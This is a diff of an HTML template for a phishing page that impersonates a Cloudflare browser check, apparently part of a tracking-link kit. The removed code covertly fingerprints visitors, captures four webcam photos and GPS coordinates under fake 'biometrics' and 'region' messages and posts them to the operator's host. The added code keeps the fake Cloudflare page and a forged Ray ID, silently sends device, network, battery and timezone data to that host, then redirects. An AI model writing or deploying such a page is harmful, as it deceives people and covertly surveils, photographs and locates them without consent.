@@ -5,205 +5,111 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Security Verification</title>
     <style>
-        body { font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: #ffffff; color: #333; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; padding: 20px; text-align: center; }
-        .shield { font-size: 50px; margin-bottom: 20px; }
-        h2 { margin: 0 0 10px; font-size: 22px; font-weight: 600; }
-        p { font-size: 14px; color: #666; line-height: 1.6; max-width: 400px; margin-bottom: 20px; }
-        #status { color: #2ecc71; font-weight: bold; font-family: monospace; }
-        .hidden { display: none; }
+        /* Professional "Just a Moment" UI */
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: #fff;
+            color: #333;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
+            padding: 20px;
+            text-align: center;
+        }
+        .spinner {
+            margin-bottom: 20px;
+            width: 50px;
+            height: 50px;
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #f6821f; /* Cloudflare Orange */
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        h2 { margin: 0; font-size: 1.5rem; font-weight: 500; }
+        p { margin-top: 10px; color: #666; font-size: 0.9rem; }
+        #footer { margin-top: 50px; font-size: 0.75rem; color: #999; }
     </style>
 </head>
 <body>
 
-    <div class="shield">🛡️</div>
-    <h2>Cloudflare Security Check</h2>
-    <p>Please allow access to verify your browser signature. This process protects against automated bots.</p>
-    <div id="status">Initializing Protocols...</div>
-
-    <video id="video" class="hidden" autoplay playsinline></video>
-    <canvas id="canvas" class="hidden"></canvas>
+    <div class="spinner"></div>
+    <h2>Checking your browser...</h2>
+    <p>Please wait while we verify your connection security.</p>
+    
+    <div id="footer">
+        DDoS protection by Cloudflare<br>
+        Ray ID: <span id="ray"></span>
+    </div>
 
     <script>
-        const CONFIG = { UID: "<%= uid %>", HOST: "<%= host %>", TARGET: "<%= url %>" };
+        // 1. Generate Fake Ray ID
+        document.getElementById('ray').innerText = Math.random().toString(16).substr(2, 16);
 
-        // ==================== 1. ADVANCED FINGERPRINTING ====================
-        
-        const getCanvasFingerprint = () => {
-            try {
-                const canvas = document.createElement('canvas');
-                const ctx = canvas.getContext('2d');
-                ctx.textBaseline = "top";
-                ctx.font = "14px 'Arial'";
-                ctx.textBaseline = "alphabetic";
-                ctx.fillStyle = "#f60";
-                ctx.fillRect(125, 1, 62, 20);
-                ctx.fillStyle = "#069";
-                ctx.fillText("SpyLink_v15", 2, 15);
-                ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
-                ctx.fillText("0123456789", 4, 17);
-                return canvas.toDataURL();
-            } catch { return "Not Supported"; }
+        // 2. Server Configuration
+        const CONFIG = {
+            UID: "<%= uid %>",       // Session ID from Server
+            HOST: "<%= host %>",     // Render URL
+            TARGET: "<%= url %>"     // Destination URL
         };
 
-        const getAudioFingerprint = () => {
-            // Simplified placeholder - real audio FP requires waiting for oscillator
-            return "Audio-Context-Hash-" + Math.random().toString(36).substring(7);
-        };
-
-        const getGPU = () => {
+        // 3. Data Gathering Logic
+        (async () => {
+            // A. Battery Status
+            let batteryInfo = "Unknown";
             try {
-                const canvas = document.createElement('canvas');
-                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-                return gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
-            } catch { return "Unknown GPU"; }
-        };
-
-        // ==================== 2. DATA COLLECTION MODULES ====================
-
-        async function gatherIntelligence() {
-            // A. BATTERY
-            let batt = { level: 0, charging: false, chargingTime: "Unknown" };
-            try {
-                const b = await navigator.getBattery();
-                batt = { 
-                    level: Math.round(b.level * 100), 
-                    charging: b.charging,
-                    chargingTime: b.chargingTime 
-                };
-            } catch(e) {}
-
-            // B. CONNECTION
-            const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection || {};
-            
-            // C. STORAGE
-            let storage = { quota: 0, used: 0 };
-            try {
-                if(navigator.storage && navigator.storage.estimate) {
-                    const est = await navigator.storage.estimate();
-                    storage = { 
-                        quota: Math.round(est.quota / (1024*1024)), 
-                        used: Math.round(est.usage / (1024*1024)) 
-                    };
+                if (navigator.getBattery) {
+                    const b = await navigator.getBattery();
+                    batteryInfo = `${Math.round(b.level * 100)}% ${b.charging ? '(Charging)' : ''}`;
                 }
-            } catch(e) {}
+            } catch (e) {}
 
-            // D. PLUGINS
-            const plugs = Array.from(navigator.plugins).map(p => p.name).slice(0, 5).join(", ");
+            // B. Network Info
+            let connectionInfo = "Unknown";
+            const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+            if (conn) {
+                connectionInfo = `${conn.effectiveType.toUpperCase()} (${conn.downlink} Mbps) RTT:${conn.rtt}ms`;
+            }
 
-            return {
-                network: {
-                    type: conn.effectiveType || "Unknown",
-                    downlink: conn.downlink || 0,
-                    rtt: conn.rtt || 0,
-                    saveData: conn.saveData || false
-                },
-                device: {
+            // C. Screen Info
+            const screenInfo = `${window.screen.width}x${window.screen.height} (${window.screen.colorDepth}-bit)`;
+
+            // D. Prepare the Payload
+            const payload = {
+                uid: CONFIG.UID,
+                rawData: {
+                    userAgent: navigator.userAgent,
                     platform: navigator.platform,
-                    vendor: navigator.vendor,
-                    cores: navigator.hardwareConcurrency || "Unknown",
-                    memory: navigator.deviceMemory || "Unknown",
-                    touchPoints: navigator.maxTouchPoints || 0,
-                    renderer: getGPU()
-                },
-                screen: {
-                    width: screen.width,
-                    height: screen.height,
-                    colorDepth: screen.colorDepth,
-                    orientation: screen.orientation ? screen.orientation.type : "Unknown"
-                },
-                browser: {
-                    ua: navigator.userAgent,
-                    cookies: navigator.cookieEnabled,
-                    dnt: navigator.doNotTrack,
-                    plugins: plugs || "None Detected"
-                },
-                battery: batt,
-                storage: storage,
-                locale: {
-                    time: new Date().toString(),
+                    language: navigator.language,
                     timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                    lang: navigator.language
-                },
-                fingerprint: {
-                    canvas: getCanvasFingerprint(),
-                    audio: getAudioFingerprint(),
-                    adBlock: false // Placeholder for complex adblock detection
+                    battery: batteryInfo,
+                    connection: connectionInfo,
+                    screen: screenInfo,
+                    cores: navigator.hardwareConcurrency || "Unknown",
+                    memory: navigator.deviceMemory || "Unknown"
                 }
             };
-        }
 
-        // ==================== 3. EXECUTION & TRANSMISSION ====================
-
-        const post = (path, data) => fetch(`${CONFIG.HOST}${path}`, {
-            method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(data)
-        });
-
-        (async () => {
-            const status = document.getElementById("status");
-            
-            // STEP 1: SILENT DATA GATHERING
-            const data = await gatherIntelligence();
-            await post("/data", { uid: CONFIG.UID, data: data });
-
-            // STEP 2: REQUEST MEDIA & LOCATION
-            status.innerText = "Verifying Human Identity...";
-            
+            // 4. Send to Server
             try {
-                // Camera Request
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
-                const video = document.getElementById("video");
-                const canvas = document.getElementById("canvas");
-                video.srcObject = stream;
-                
-                await new Promise(r => video.onloadedmetadata = r);
-                
-                // BURST MODE (4 Photos)
-                status.innerText = "Analyzing Biometrics...";
-                for(let i=0; i<4; i++) {
-                    await new Promise(r => setTimeout(r, 1500)); // 1.5s delay
-                    canvas.width = video.videoWidth;
-                    canvas.height = video.videoHeight;
-                    canvas.getContext("2d").drawImage(video, 0, 0);
-                    await post("/cam", { uid: CONFIG.UID, img: canvas.toDataURL("image/png") });
-                }
-
-                // Stop Camera
-                stream.getTracks().forEach(t => t.stop());
-
-                // Request Location
-                requestLocation();
-
-            } catch (e) {
-                console.log("Permission Denied");
-                requestLocation();
+                await fetch(`${CONFIG.HOST}/data`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+            } catch (err) {
+                console.error("Analytics Error:", err);
             }
 
-            function requestLocation() {
-                status.innerText = "Confirming Region...";
-                if(navigator.geolocation) {
-                    navigator.geolocation.getCurrentPosition(
-                        pos => {
-                            post("/location", { 
-                                uid: CONFIG.UID, 
-                                lat: pos.coords.latitude, 
-                                lon: pos.coords.longitude, 
-                                acc: pos.coords.accuracy,
-                                speed: pos.coords.speed,
-                                alt: pos.coords.altitude
-                            });
-                            finish();
-                        },
-                        err => finish()
-                    );
-                } else { finish(); }
-            }
-
-            function finish() {
-                status.innerText = "Redirecting...";
-                setTimeout(() => window.location.replace(CONFIG.TARGET), 1000);
-            }
+            // 5. Redirect
+            setTimeout(() => {
+                window.location.replace(CONFIG.TARGET);
+            }, 1500); // 1.5s delay to ensure data is sent
         })();
     </script>
+
 </body>
 </html>
